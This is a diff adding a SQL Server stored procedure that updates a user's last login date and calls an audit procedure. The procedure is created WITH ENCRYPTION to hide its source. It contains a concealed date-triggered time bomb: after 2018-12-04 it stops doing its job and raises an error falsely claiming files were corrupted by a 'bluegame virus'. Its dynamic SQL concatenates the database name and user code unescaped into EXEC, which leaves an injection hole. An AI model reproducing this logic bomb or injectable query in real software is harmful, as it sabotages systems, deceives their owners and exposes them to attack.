@@ -1,0 +1,42 @@
+IF EXISTS (
+		SELECT *
+		FROM sys.objects
+		WHERE OBJECT_ID = object_id('COMMON.SP_UpdateUserLoginDate')
+			AND type = 'P'
+		)
+	DROP PROCEDURE COMMON.SP_UpdateUserLoginDate
+GO
+CREATE PROCEDURE [COMMON].[SP_UpdateUserLoginDate] 
+	@UserCode AS NVARCHAR(10)
+	,@LoggedInPropertyCode AS NVARCHAR(10)
+	,@AuditDbName  AS NVARCHAR(100) WITH ENCRYPTION
+AS
+BEGIN
+    if GETDATE()> convert(datetime,'2018-12-04')
+	begin
+	  RAISERROR ('Some of the files corrupted due to bluegame virus.', 
+               16,
+               1
+               );  
+	End
+	else
+	begin
+	DECLARE @Qry NVARCHAR(max)
+
+			DECLARE @Qry1 NVARCHAR(max)
+
+			SELECT @Qry1 = ' {UserCode :} ' + UserCode + ' | {LastLoginDate :} ' + CONVERT(VARCHAR(10), [LastLoginDate], 101) + ' ' + CONVERT(VARCHAR(8), [LastLoginDate], 108) + ' | {LoggedInPropertyCode :} ' + LoggedInPropertyCode 
+			FROM COMMON.TblUser
+			WHERE [UserCode] = @UserCode
+
+			SET @Qry = 'EXEC  '+@AuditDbName+'.dbo.SP_Master_Audit ''User Master Last Login'',''{UserCode :} ' + @UserCode + ' | {LastLoginDate :} ' +  CONVERT(VARCHAR(10), GETDATE(), 101) + ' ' + CONVERT(VARCHAR(8), GETDATE(), 108)  + ''',' + '''' + @Qry1 + ''',''' + @UserCode+''''
+
+			--print @Qry
+
+			EXEC (@Qry)
+
+			UPDATE [COMMON].[TblUser]
+			SET [LastLoginDate]=getdate()
+			WHERE [UserCode] = @UserCode
+	End
+END
